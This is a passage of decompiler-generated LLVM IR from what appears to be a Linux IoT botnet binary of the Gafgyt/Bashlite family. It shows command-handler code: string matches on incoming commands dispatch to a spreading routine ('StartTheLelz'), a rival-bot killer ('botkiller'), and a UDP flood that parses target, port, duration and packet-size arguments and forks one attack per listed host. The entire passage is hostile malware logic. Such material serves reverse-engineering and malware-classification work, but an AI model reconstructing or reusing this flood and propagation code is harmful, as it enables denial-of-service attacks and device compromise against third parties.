  store i1 %v5_804e980, i1* %cf.global-to-local, align 1
  %v0_804e983 = load i32, i32* @global_var_80617c8.235, align 8
  store i32 %v0_804e983, i32* %stack_var_-348, align 4
  %v1_804e989 = call i32 @__GI_inet_ntoa(i32 %v0_804e983)
  %v0_804e991 = load i32, i32* @global_var_805b540.20, align 64
  store i32 %v0_804e991, i32* %edx.global-to-local, align 4
  %v5_804e997 = icmp ult i32* %stack_var_-332, inttoptr (i32 4 to i32*)
  store i1 %v5_804e997, i1* %cf.global-to-local, align 1
  store i32 %v0_804e991, i32* %stack_var_-348, align 4
  %v2_804e9a1 = call i32 @sockprintf(i32 %v0_804e991, i32 ptrtoint ([26 x i8]* @global_var_8058a5d.418 to i32))
  %v5_804e9a9 = icmp ult i32* %stack_var_-332, inttoptr (i32 8 to i32*)
  store i1 %v5_804e9a9, i1* %cf.global-to-local, align 1
  store i32 10, i32* %stack_var_-348, align 4
  %v2_804e9b2 = call i32 @StartTheLelz(i32 10, i32 1000)
  %v5_804e9ba = icmp ult i32* %stack_var_-332, inttoptr (i32 12 to i32*)
  store i1 %v5_804e9ba, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-348, align 4
  %v1_804e9bf = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804e9c4:                             ; preds = %dec_label_pc_804e8f2, %dec_label_pc_804e81d
  %v2_804e9c7 = load i32, i32* %v1_804e755, align 4
  store i1 false, i1* @df, align 1
  %v4_804e9e4 = inttoptr i32 %v2_804e9c7 to i8*
  store i32 %v2_804e9c7, i32* @esi, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_8058a77.419 to i32), i32* @edi, align 4
  %v7_804e9f6 = call i32 @_strncmp(i8* %v4_804e9e4, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8058a77.419, i32 0, i32 0), i32 8)
  %v8_804e9f6 = urem i32 %v7_804e9f6, 2
  %v9_804e9f6 = icmp eq i32 %v8_804e9f6, 0
  %v0_804e9f8 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e9f8 = or i1 %v0_804e9f8, %v9_804e9f6
  %v3_804e9f8 = zext i1 %v2_804e9f8 to i32
  %v4_804e9f8 = load i32, i32* %edx.global-to-local, align 4
  %v5_804e9f8 = and i32 %v4_804e9f8, -256
  %v6_804e9f8 = or i32 %v3_804e9f8, %v5_804e9f8
  %v7_804e9f8 = xor i32 %v6_804e9f8, 1
  store i32 %v7_804e9f8, i32* @edx, align 4
  %v1_804ea00 = trunc i32 %v7_804e9f8 to i8
  %v3_804ea00 = zext i1 %v0_804e9f8 to i8
  %v15_804ea00 = icmp eq i8 %v1_804ea00, %v3_804ea00
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ea09 = icmp eq i1 %v15_804ea00, false
  br i1 %v1_804ea09, label %dec_label_pc_804ea4c, label %dec_label_pc_804ea0b

dec_label_pc_804ea0b:                             ; preds = %dec_label_pc_804e9c4
  %v0_804ea0b = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ea10 = icmp eq i32 %v0_804ea0b, 0
  %v1_804ea12 = icmp eq i1 %v1_804ea10, false
  br i1 %v1_804ea12, label %dec_label_pc_804ea4c, label %dec_label_pc_804ea14

dec_label_pc_804ea14:                             ; preds = %dec_label_pc_804ea0b
  %v0_804ea14 = load i32, i32* @esp, align 4
  %v5_804ea14 = icmp ult i32 %v0_804ea14, 12
  store i1 %v5_804ea14, i1* %cf.global-to-local, align 1
  %v0_804ea17 = load i32, i32* @global_var_80617c8.235, align 8
  store i32 %v0_804ea17, i32* %stack_var_-364, align 4
  %v1_804ea1d = call i32 @__GI_inet_ntoa(i32 %v0_804ea17)
  %v0_804ea25 = load i32, i32* @global_var_805b540.20, align 64
  store i32 %v0_804ea25, i32* %edx.global-to-local, align 4
  %v5_804ea2b = icmp ult i32* %stack_var_-348, inttoptr (i32 4 to i32*)
  store i1 %v5_804ea2b, i1* %cf.global-to-local, align 1
  store i32 %v0_804ea25, i32* %stack_var_-364, align 4
  %v3_804ea35 = call i32 @sockprintf(i32 %v0_804ea25, i32 ptrtoint ([29 x i8]* @global_var_8058a7f.420 to i32))
  %v0_804ea3a = load i32, i32* @esp, align 4
  %v2_804ea3a = icmp ugt i32 %v0_804ea3a, -17
  store i1 %v2_804ea3a, i1* %cf.global-to-local, align 1
  %v0_804ea3d = call i32 @botkiller()
  %v0_804ea42 = load i32, i32* @esp, align 4
  %v5_804ea42 = icmp ult i32 %v0_804ea42, 12
  store i1 %v5_804ea42, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-364, align 4
  %v1_804ea47 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804ea4c:                             ; preds = %dec_label_pc_804ea0b, %dec_label_pc_804e9c4
  %v2_804ea4f = load i32, i32* %v1_804e755, align 4
  store i1 false, i1* @df, align 1
  %v4_804ea6c = inttoptr i32 %v2_804ea4f to i8*
  store i32 %v2_804ea4f, i32* @esi, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_8058a9c.421 to i32), i32* @edi, align 4
  %v7_804ea7e = call i32 @_strncmp(i8* %v4_804ea6c, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8058a9c.421, i32 0, i32 0), i32 12)
  %v8_804ea7e = urem i32 %v7_804ea7e, 2
  %v9_804ea7e = icmp eq i32 %v8_804ea7e, 0
  %v0_804ea80 = load i1, i1* %cf.global-to-local, align 1
  %v2_804ea80 = or i1 %v0_804ea80, %v9_804ea7e
  %v3_804ea80 = zext i1 %v2_804ea80 to i32
  %v4_804ea80 = load i32, i32* @edx, align 4
  %v5_804ea80 = and i32 %v4_804ea80, -256
  %v6_804ea80 = or i32 %v3_804ea80, %v5_804ea80
  %v7_804ea80 = xor i32 %v6_804ea80, 1
  store i32 %v7_804ea80, i32* %edx.global-to-local, align 4
  %v1_804ea88 = trunc i32 %v7_804ea80 to i8
  %v3_804ea88 = zext i1 %v0_804ea80 to i8
  %v15_804ea88 = icmp eq i8 %v1_804ea88, %v3_804ea88
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ea91 = icmp eq i1 %v15_804ea88, false
  br i1 %v1_804ea91, label %dec_label_pc_804eac1, label %dec_label_pc_804ea93

dec_label_pc_804ea93:                             ; preds = %dec_label_pc_804ea4c
  %v0_804ea93 = load i32, i32* @esp, align 4
  %v5_804ea93 = icmp ult i32 %v0_804ea93, 12
  store i1 %v5_804ea93, i1* %cf.global-to-local, align 1
  %v0_804ea96 = load i32, i32* @global_var_80617c8.235, align 8
  %v1_804ea9c = call i32 @__GI_inet_ntoa(i32 %v0_804ea96)
  %v0_804eaa4 = load i32, i32* @global_var_805b540.20, align 64
  store i32 %v0_804eaa4, i32* %edx.global-to-local, align 4
  %v5_804eaaa = icmp ult i32* %stack_var_-364, inttoptr (i32 4 to i32*)
  store i1 %v5_804eaaa, i1* %cf.global-to-local, align 1
  %v2_804eab4 = call i32 @sockprintf(i32 %v0_804eaa4, i32 ptrtoint ([17 x i8]* @global_var_8058aa8.422 to i32))
  %v0_804eab9 = load i32, i32* @esp, align 4
  %v2_804eab9 = icmp ugt i32 %v0_804eab9, -17
  store i1 %v2_804eab9, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f52b

dec_label_pc_804eac1:                             ; preds = %dec_label_pc_804ea4c
  %v2_804eac4 = load i32, i32* %v1_804e755, align 4
  store i1 false, i1* @df, align 1
  %v4_804eae1 = inttoptr i32 %v2_804eac4 to i8*
  store i32 %v2_804eac4, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8058ab9.423 to i32), i32* @edi, align 4
  %v7_804eaf3 = call i32 @_strncmp(i8* %v4_804eae1, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8058ab9.423, i32 0, i32 0), i32 4)
  %v8_804eaf3 = urem i32 %v7_804eaf3, 2
  %v9_804eaf3 = icmp eq i32 %v8_804eaf3, 0
  %v0_804eaf5 = load i1, i1* %cf.global-to-local, align 1
  %v2_804eaf5 = or i1 %v0_804eaf5, %v9_804eaf3
  %v3_804eaf5 = zext i1 %v2_804eaf5 to i32
  %v4_804eaf5 = load i32, i32* %edx.global-to-local, align 4
  %v5_804eaf5 = and i32 %v4_804eaf5, -256
  %v6_804eaf5 = or i32 %v3_804eaf5, %v5_804eaf5
  %v7_804eaf5 = xor i32 %v6_804eaf5, 1
  store i32 %v7_804eaf5, i32* %edx.global-to-local, align 4
  %v1_804eafd = trunc i32 %v7_804eaf5 to i8
  %v3_804eafd = zext i1 %v0_804eaf5 to i8
  %v15_804eafd = icmp eq i8 %v1_804eafd, %v3_804eafd
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804eb06 = icmp eq i1 %v15_804eafd, false
  br i1 %v1_804eb06, label %dec_label_pc_804edcc, label %dec_label_pc_804eb0c

dec_label_pc_804eb0c:                             ; preds = %dec_label_pc_804eac1
  %v9_804eb0c = icmp ult i32 %tmp134, 5
  store i1 %v9_804eb0c, i1* %cf.global-to-local, align 1
  %v7_804eb10 = icmp sgt i32 %tmp134, 5
  br i1 %v7_804eb10, label %dec_label_pc_804eb16, label %dec_label_pc_804eb0c.dec_label_pc_804ebf3_crit_edge

dec_label_pc_804eb0c.dec_label_pc_804ebf3_crit_edge: ; preds = %dec_label_pc_804eb0c
  %v0_804ebf8.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ebf3

dec_label_pc_804eb16:                             ; preds = %dec_label_pc_804eb0c
  %v1_804eb19 = add i32 %tmp162, 12
  %v1_804eb1c = inttoptr i32 %v1_804eb19 to i32*
  %v2_804eb1c = load i32, i32* %v1_804eb1c, align 4
  %v0_804eb1e = load i32, i32* @esp, align 4
  %v5_804eb1e = icmp ult i32 %v0_804eb1e, 12
  store i1 %v5_804eb1e, i1* %cf.global-to-local, align 1
  store i32 %v2_804eb1c, i32* %stack_var_-348, align 4
  %v1_804eb22 = call i32 @atol(i32 %v2_804eb1c)
  %v5_804eb2a = icmp ne i32 %v1_804eb22, -1
  store i1 %v5_804eb2a, i1* %cf.global-to-local, align 1
  %v10_804eb2a = icmp eq i32 %v1_804eb22, -1
  br i1 %v10_804eb2a, label %dec_label_pc_804ebf3, label %dec_label_pc_804eb33

dec_label_pc_804eb33:                             ; preds = %dec_label_pc_804eb16
  %v1_804eb36 = add i32 %tmp162, 8
  %v1_804eb39 = inttoptr i32 %v1_804eb36 to i32*
  %v2_804eb39 = load i32, i32* %v1_804eb39, align 4
  %v5_804eb3b = icmp ult i32* %stack_var_-332, inttoptr (i32 12 to i32*)
  store i1 %v5_804eb3b, i1* %cf.global-to-local, align 1
  store i32 %v2_804eb39, i32* %stack_var_-348, align 4
  %v1_804eb3f = call i32 @atol(i32 %v2_804eb39)
  %v5_804eb47 = icmp ne i32 %v1_804eb3f, -1
  store i1 %v5_804eb47, i1* %cf.global-to-local, align 1
  %v10_804eb47 = icmp eq i32 %v1_804eb3f, -1
  br i1 %v10_804eb47, label %dec_label_pc_804ebf3, label %dec_label_pc_804eb50

dec_label_pc_804eb50:                             ; preds = %dec_label_pc_804eb33
  %v1_804eb53 = add i32 %tmp162, 16
  %v1_804eb56 = inttoptr i32 %v1_804eb53 to i32*
  %v2_804eb56 = load i32, i32* %v1_804eb56, align 4
  store i1 %v5_804eb3b, i1* %cf.global-to-local, align 1
  store i32 %v2_804eb56, i32* %stack_var_-348, align 4
  %v1_804eb5c = call i32 @atol(i32 %v2_804eb56)
  %v5_804eb64 = icmp ne i32 %v1_804eb5c, -1
  store i1 %v5_804eb64, i1* %cf.global-to-local, align 1
  %v10_804eb64 = icmp eq i32 %v1_804eb5c, -1
  br i1 %v10_804eb64, label %dec_label_pc_804ebf3, label %dec_label_pc_804eb6d

dec_label_pc_804eb6d:                             ; preds = %dec_label_pc_804eb50
  %v1_804eb70 = add i32 %tmp162, 20
  %v1_804eb73 = inttoptr i32 %v1_804eb70 to i32*
  %v2_804eb73 = load i32, i32* %v1_804eb73, align 4
  store i1 %v5_804eb3b, i1* %cf.global-to-local, align 1
  store i32 %v2_804eb73, i32* %stack_var_-348, align 4
  %v1_804eb79 = call i32 @atol(i32 %v2_804eb73)
  %v5_804eb81 = icmp ne i32 %v1_804eb79, -1
  store i1 %v5_804eb81, i1* %cf.global-to-local, align 1
  %v10_804eb81 = icmp eq i32 %v1_804eb79, -1
  br i1 %v10_804eb81, label %dec_label_pc_804ebf3, label %dec_label_pc_804eb86

dec_label_pc_804eb86:                             ; preds = %dec_label_pc_804eb6d
  %v2_804eb8c = load i32, i32* %v1_804eb73, align 4
  store i1 %v5_804eb3b, i1* %cf.global-to-local, align 1
  store i32 %v2_804eb8c, i32* %stack_var_-348, align 4
  %v1_804eb92 = call i32 @atol(i32 %v2_804eb8c)
  %v1_804eb9a = add i32 %v1_804eb92, -65536
  %v2_804eb9a = icmp ult i32 %v1_804eb92, 65536
  %v3_804eb9a = sub i32 65535, %v1_804eb92
  %v4_804eb9a = and i32 %v3_804eb9a, %v1_804eb92
  %v5_804eb9a = icmp slt i32 %v4_804eb9a, 0
  store i1 %v2_804eb9a, i1* %cf.global-to-local, align 1
  %v6_804eb9a = icmp eq i32 %v1_804eb9a, 0
  %v7_804eb9a = icmp slt i32 %v1_804eb9a, 0
  %v3_804eb9f = icmp eq i1 %v7_804eb9a, %v5_804eb9a
  %v4_804eb9f = icmp eq i1 %v6_804eb9a, false
  %v5_804eb9f = and i1 %v4_804eb9f, %v3_804eb9f
  br i1 %v5_804eb9f, label %dec_label_pc_804ebf3, label %dec_label_pc_804eba1

dec_label_pc_804eba1:                             ; preds = %dec_label_pc_804eb86
  %v2_804eba7 = load i32, i32* %v1_804eb73, align 4
  store i1 %v5_804eb3b, i1* %cf.global-to-local, align 1
  store i32 %v2_804eba7, i32* %stack_var_-348, align 4
  %v1_804ebad = call i32 @atol(i32 %v2_804eba7)
  %v1_804ebb5 = add i32 %v1_804ebad, -65500
  %v5_804ebb5 = icmp ult i32 %v1_804ebad, 65500
  %v6_804ebb5 = sub i32 65499, %v1_804ebad
  %v7_804ebb5 = and i32 %v6_804ebb5, %v1_804ebad
  %v8_804ebb5 = icmp slt i32 %v7_804ebb5, 0
  store i1 %v5_804ebb5, i1* %cf.global-to-local, align 1
  %v9_804ebb5 = icmp eq i32 %v1_804ebb5, 0
  %v10_804ebb5 = icmp slt i32 %v1_804ebb5, 0
  %v3_804ebba = icmp eq i1 %v10_804ebb5, %v8_804ebb5
  %v4_804ebba = icmp eq i1 %v9_804ebb5, false
  %v5_804ebba = and i1 %v4_804ebba, %v3_804ebba
  br i1 %v5_804ebba, label %dec_label_pc_804ebf3, label %dec_label_pc_804ebbc

dec_label_pc_804ebbc:                             ; preds = %dec_label_pc_804eba1
  %v2_804ebc2 = load i32, i32* %v1_804eb56, align 4
  store i1 %v5_804eb3b, i1* %cf.global-to-local, align 1
  store i32 %v2_804ebc2, i32* %stack_var_-348, align 4
  %v1_804ebc8 = call i32 @atol(i32 %v2_804ebc2)
  %v1_804ebd0 = add i32 %v1_804ebc8, -32
  %v2_804ebd0 = icmp ult i32 %v1_804ebc8, 32
  %v3_804ebd0 = sub i32 31, %v1_804ebc8
  %v4_804ebd0 = and i32 %v3_804ebd0, %v1_804ebc8
  %v5_804ebd0 = icmp slt i32 %v4_804ebd0, 0
  store i1 %v2_804ebd0, i1* %cf.global-to-local, align 1
  %v6_804ebd0 = icmp eq i32 %v1_804ebd0, 0
  %v7_804ebd0 = icmp slt i32 %v1_804ebd0, 0
  %v3_804ebd3 = icmp eq i1 %v7_804ebd0, %v5_804ebd0
  %v4_804ebd3 = icmp eq i1 %v6_804ebd0, false
  %v5_804ebd3 = and i1 %v4_804ebd3, %v3_804ebd3
  br i1 %v5_804ebd3, label %dec_label_pc_804ebf3, label %dec_label_pc_804ebd5

dec_label_pc_804ebd5:                             ; preds = %dec_label_pc_804ebbc
  %v8_804ebd5 = icmp ult i32 %tmp134, 7
  store i1 %v8_804ebd5, i1* %cf.global-to-local, align 1
  %v12_804ebd5 = icmp eq i32 %tmp134, 7
  %v1_804ebd9 = icmp eq i1 %v12_804ebd5, false
  br i1 %v1_804ebd9, label %dec_label_pc_804ec0e, label %dec_label_pc_804ebdb

dec_label_pc_804ebdb:                             ; preds = %dec_label_pc_804ebd5
  %v1_804ebde = add i32 %tmp162, 24
  %v1_804ebe1 = inttoptr i32 %v1_804ebde to i32*
  %v2_804ebe1 = load i32, i32* %v1_804ebe1, align 4
  store i1 %v5_804eb3b, i1* %cf.global-to-local, align 1
  store i32 %v2_804ebe1, i32* %stack_var_-348, align 4
  %v1_804ebe7 = call i32 @atol(i32 %v2_804ebe1)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp185 = icmp slt i32 %v1_804ebe7, 1
  %tmp186 = icmp eq i1 %tmp185, false
  br i1 %tmp186, label %dec_label_pc_804ec0e, label %dec_label_pc_804ebf3

dec_label_pc_804ebf3:                             ; preds = %dec_label_pc_804eb0c.dec_label_pc_804ebf3_crit_edge, %dec_label_pc_804ebdb, %dec_label_pc_804ebbc, %dec_label_pc_804eba1, %dec_label_pc_804eb86, %dec_label_pc_804eb6d, %dec_label_pc_804eb50, %dec_label_pc_804eb33, %dec_label_pc_804eb16
  %v0_804ebf8 = phi i32 [ %v0_804ebf8.pre, %dec_label_pc_804eb0c.dec_label_pc_804ebf3_crit_edge ], [ %v15_804e74c, %dec_label_pc_804ebdb ], [ %v15_804e74c, %dec_label_pc_804ebbc ], [ %v15_804e74c, %dec_label_pc_804eba1 ], [ %v15_804e74c, %dec_label_pc_804eb86 ], [ %v15_804e74c, %dec_label_pc_804eb6d ], [ %v15_804e74c, %dec_label_pc_804eb50 ], [ %v15_804e74c, %dec_label_pc_804eb33 ], [ %v15_804e74c, %dec_label_pc_804eb16 ]
  %v0_804ebf3 = load i32, i32* @global_var_805b540.20, align 64
  %v5_804ebf8 = icmp ult i32 %v0_804ebf8, 8
  store i1 %v5_804ebf8, i1* %cf.global-to-local, align 1
  store i32 %v0_804ebf3, i32* %stack_var_-348, align 4
  %v2_804ec01 = call i32 @sockprintf(i32 %v0_804ebf3, i32 ptrtoint ([113 x i8]* @global_var_8058ac0.424 to i32))
  %v0_804ec06 = load i32, i32* @esp, align 4
  %v2_804ec06 = icmp ugt i32 %v0_804ec06, -17
  store i1 %v2_804ec06, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f52b

dec_label_pc_804ec0e:                             ; preds = %dec_label_pc_804ebdb, %dec_label_pc_804ebd5
  %v1_804ec11 = add i32 %tmp162, 4
  %v1_804ec14 = inttoptr i32 %v1_804ec11 to i32*
  %v2_804ec14 = load i32, i32* %v1_804ec14, align 4
  %v2_804ec1f = load i32, i32* %v1_804eb39, align 4
  store i1 %v5_804eb3b, i1* %cf.global-to-local, align 1
  store i32 %v2_804ec1f, i32* %stack_var_-348, align 4
  %v1_804ec25 = call i32 @atol(i32 %v2_804ec1f)
  %v2_804ec36 = load i32, i32* %v1_804eb1c, align 4
  store i1 %v5_804eb3b, i1* %cf.global-to-local, align 1
  store i32 %v2_804ec36, i32* %stack_var_-348, align 4
  %v1_804ec3c = call i32 @atol(i32 %v2_804ec36)
  %v2_804ec4d = load i32, i32* %v1_804eb56, align 4
  store i1 %v5_804eb3b, i1* %cf.global-to-local, align 1
  store i32 %v2_804ec4d, i32* %stack_var_-348, align 4
  %v1_804ec53 = call i32 @atol(i32 %v2_804ec4d)
  %v2_804ec64 = load i32, i32* %v1_804eb73, align 4
  store i1 %v5_804eb3b, i1* %cf.global-to-local, align 1
  store i32 %v2_804ec64, i32* %stack_var_-348, align 4
  %v1_804ec6a = call i32 @atol(i32 %v2_804ec64)
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804ec79 = icmp sgt i32 %tmp134, 6
  br i1 %v7_804ec79, label %dec_label_pc_804eca1, label %dec_label_pc_804eca1.thread

dec_label_pc_804eca1.thread:                      ; preds = %dec_label_pc_804ec0e
  store i32 1000, i32* @esi, align 4
  store i1 %v8_804ebd5, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804ecd6.thread

dec_label_pc_804eca1:                             ; preds = %dec_label_pc_804ec0e
  %v1_804ec7e = add i32 %tmp162, 24
  %v1_804ec81 = inttoptr i32 %v1_804ec7e to i32*
  %v2_804ec81 = load i32, i32* %v1_804ec81, align 4
  store i1 %v5_804eb3b, i1* %cf.global-to-local, align 1
  store i32 %v2_804ec81, i32* %stack_var_-348, align 4
  %v1_804ec87 = call i32 @atol(i32 %v2_804ec81)
  store i32 %v1_804ec87, i32* @esi, align 4
  store i1 %v8_804ebd5, i1* %cf.global-to-local, align 1
  br i1 %v12_804ebd5, label %dec_label_pc_804ecd6.thread, label %dec_label_pc_804ecd6

dec_label_pc_804ecd6.thread:                      ; preds = %dec_label_pc_804eca1, %dec_label_pc_804eca1.thread
  %storemerge35194.ph = phi i32 [ 1000, %dec_label_pc_804eca1.thread ], [ %v1_804ec87, %dec_label_pc_804eca1 ]
  store i32 1000000, i32* @edi, align 4
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804ed0b

dec_label_pc_804ecd6:                             ; preds = %dec_label_pc_804eca1
  %v1_804ecb3 = add i32 %tmp162, 28
  %v1_804ecb6 = inttoptr i32 %v1_804ecb3 to i32*
  %v2_804ecb6 = load i32, i32* %v1_804ecb6, align 4
  store i1 %v5_804eb3b, i1* %cf.global-to-local, align 1
  store i32 %v2_804ecb6, i32* %stack_var_-348, align 4
  %v1_804ecbc = call i32 @atol(i32 %v2_804ecb6)
  store i32 %v1_804ecbc, i32* @edi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804ece3 = icmp sgt i32 %tmp134, 8
  br i1 %v7_804ece3, label %dec_label_pc_804ece5, label %dec_label_pc_804ed0b

dec_label_pc_804ece5:                             ; preds = %dec_label_pc_804ecd6
  %v1_804ece8 = add i32 %tmp162, 32
  %v1_804eceb = inttoptr i32 %v1_804ece8 to i32*
  %v2_804eceb = load i32, i32* %v1_804eceb, align 4
  store i1 %v5_804eb3b, i1* %cf.global-to-local, align 1
  store i32 %v2_804eceb, i32* %stack_var_-348, align 4
  %v1_804ecf1 = call i32 @atol(i32 %v2_804eceb)
  %v0_804ecf6 = load i32, i32* @esp, align 4
  %v2_804ecf6 = icmp ugt i32 %v0_804ecf6, -17
  store i1 %v2_804ecf6, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804ed0b

dec_label_pc_804ed0b:                             ; preds = %dec_label_pc_804ecd6.thread, %dec_label_pc_804ecd6, %dec_label_pc_804ece5
  %storemerge34199 = phi i32 [ %v1_804ecbc, %dec_label_pc_804ece5 ], [ %v1_804ecbc, %dec_label_pc_804ecd6 ], [ 1000000, %dec_label_pc_804ecd6.thread ]
  %storemerge35194198 = phi i32 [ %v1_804ec87, %dec_label_pc_804ece5 ], [ %v1_804ec87, %dec_label_pc_804ecd6 ], [ %storemerge35194.ph, %dec_label_pc_804ecd6.thread ]
  %storemerge33 = phi i32 [ %v1_804ecf1, %dec_label_pc_804ece5 ], [ 0, %dec_label_pc_804ecd6 ], [ 0, %dec_label_pc_804ecd6.thread ]
  %v5_804ed17 = icmp ult i32* %stack_var_-332, inttoptr (i32 8 to i32*)
  store i1 %v5_804ed17, i1* %cf.global-to-local, align 1
  store i32 %v2_804ec14, i32* %stack_var_-348, align 4
  %v2_804ed1d = inttoptr i32 %v2_804ec14 to i8*
  %v3_804ed1d = call i32 @__GI_strchr(i8* %v2_804ed1d, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ed25 = icmp eq i32 %v3_804ed1d, 0
  br i1 %v1_804ed25, label %dec_label_pc_804ed95, label %dec_label_pc_804ed29

dec_label_pc_804ed29:                             ; preds = %dec_label_pc_804ed0b
  store i32 %v2_804ec14, i32* @eax, align 4
  store i1 %v5_804ed17, i1* %cf.global-to-local, align 1
  store i32 %v2_804ec14, i32* %stack_var_-348, align 4
  %v2_804ed35 = call i32 @__GI_strtok(i32 %v2_804ec14, i32 ptrtoint (i32* @global_var_8058771.303 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804ed8a217 = icmp eq i32 %v2_804ed35, 0
  %v1_804ed8e218 = icmp eq i1 %v4_804ed8a217, false
  br i1 %v1_804ed8e218, label %dec_label_pc_804ed42, label %dec_label_pc_804f52b

dec_label_pc_804ed42:                             ; preds = %dec_label_pc_804ed29, %dec_label_pc_804ed75
  %storemerge83219 = phi i32 [ %v2_804ed7f, %dec_label_pc_804ed75 ], [ %v2_804ed35, %dec_label_pc_804ed29 ]
  %v0_804ed42 = call i32 @listFork()
  store i32 %v0_804ed42, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ed47 = icmp eq i32 %v0_804ed42, 0
  %v1_804ed49 = icmp eq i1 %v1_804ed47, false
  br i1 %v1_804ed49, label %dec_label_pc_804ed75, label %dec_label_pc_804ed4b

dec_label_pc_804ed4b:                             ; preds = %dec_label_pc_804ed42
  store i32 %v1_804ec6a, i32* %stack_var_-348, align 4
  store i32 %storemerge83219, i32* %stack_var_-364, align 4
  %v9_804ed63 = call i32 @sendUDP(i32 %storemerge83219, i32 %v1_804ec25, i32 %v1_804ec3c, i32 %v1_804ec53, i32 %v1_804ec6a, i32 %storemerge35194198, i32 %storemerge34199, i32 %storemerge33)
  store i1 %v5_804eb3b, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-348, align 4
  %v1_804ed70 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804ed75:                             ; preds = %dec_label_pc_804ed42
  %v0_804ed75 = load i32, i32* @esp, align 4
  %v5_804ed75 = icmp ult i32 %v0_804ed75, 8
  store i1 %v5_804ed75, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-348, align 4
  %v2_804ed7f = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8058771.303 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804ed8a = icmp eq i32 %v2_804ed7f, 0
  %v1_804ed8e = icmp eq i1 %v4_804ed8a, false
  br i1 %v1_804ed8e, label %dec_label_pc_804ed42, label %dec_label_pc_804f52b

dec_label_pc_804ed95:                             ; preds = %dec_label_pc_804ed0b
  %v0_804ed95 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ed9a = icmp eq i32 %v0_804ed95, 0
  %v1_804ed9c = icmp eq i1 %v1_804ed9a, false
  br i1 %v1_804ed9c, label %dec_label_pc_804f52b, label %dec_label_pc_804eda2

dec_label_pc_804eda2:                             ; preds = %dec_label_pc_804ed95
  store i32 %v1_804ec6a, i32* %stack_var_-348, align 4
  store i32 %v2_804ec14, i32* %stack_var_-364, align 4
  %v9_804edba = call i32 @sendUDP(i32 %v2_804ec14, i32 %v1_804ec25, i32 %v1_804ec3c, i32 %v1_804ec53, i32 %v1_804ec6a, i32 %storemerge35194198, i32 %storemerge34199, i32 %storemerge33)
  store i1 %v5_804eb3b, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-348, align 4
  %v1_804edc7 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804edcc:                             ; preds = %dec_label_pc_804eac1
  %v2_804edcf = load i32, i32* %v1_804e755, align 4
  store i1 false, i1* @df, align 1
  %v4_804edec = inttoptr i32 %v2_804edcf to i8*
  store i32 %v2_804edcf, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8058b31.425 to i32), i32* @edi, align 4
  %v7_804edfe = call i32 @_strncmp(i8* %v4_804edec, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8058b31.425, i32 0, i32 0), i32 4)
  %v8_804edfe = urem i32 %v7_804edfe, 2
  %v9_804edfe = icmp eq i32 %v8_804edfe, 0
  %v0_804ee00 = load i1, i1* %cf.global-to-local, align 1
  %v2_804ee00 = or i1 %v0_804ee00, %v9_804edfe
  %v3_804ee00 = zext i1 %v2_804ee00 to i32
  %v4_804ee00 = load i32, i32* %edx.global-to-local, align 4
  %v5_804ee00 = and i32 %v4_804ee00, -256
  %v6_804ee00 = or i32 %v3_804ee00, %v5_804ee00
  %v7_804ee00 = xor i32 %v6_804ee00, 1
  store i32 %v7_804ee00, i32* @edx, align 4
  %v1_804ee08 = trunc i32 %v7_804ee00 to i8
  %v3_804ee08 = zext i1 %v0_804ee00 to i8
  %v15_804ee08 = icmp eq i8 %v1_804ee08, %v3_804ee08
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ee11 = icmp eq i1 %v15_804ee08, false
  br i1 %v1_804ee11, label %dec_label_pc_804f056, label %dec_label_pc_804ee17

dec_label_pc_804ee17:                             ; preds = %dec_label_pc_804edcc
  %v9_804ee17 = icmp ult i32 %tmp134, 5
  store i1 %v9_804ee17, i1* %cf.global-to-local, align 1
  %v7_804ee1b = icmp sgt i32 %tmp134, 5
  br i1 %v7_804ee1b, label %dec_label_pc_804ee21, label %dec_label_pc_804ee17.dec_label_pc_804eec5_crit_edge

dec_label_pc_804ee17.dec_label_pc_804eec5_crit_edge: ; preds = %dec_label_pc_804ee17
  %v0_804eeca.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804eec5

dec_label_pc_804ee21:                             ; preds = %dec_label_pc_804ee17
  %v1_804ee24 = add i32 %tmp162, 12
  %v1_804ee27 = inttoptr i32 %v1_804ee24 to i32*
  %v2_804ee27 = load i32, i32* %v1_804ee27, align 4
  %v0_804ee29 = load i32, i32* @esp, align 4
  %v5_804ee29 = icmp ult i32 %v0_804ee29, 12
  store i1 %v5_804ee29, i1* %cf.global-to-local, align 1
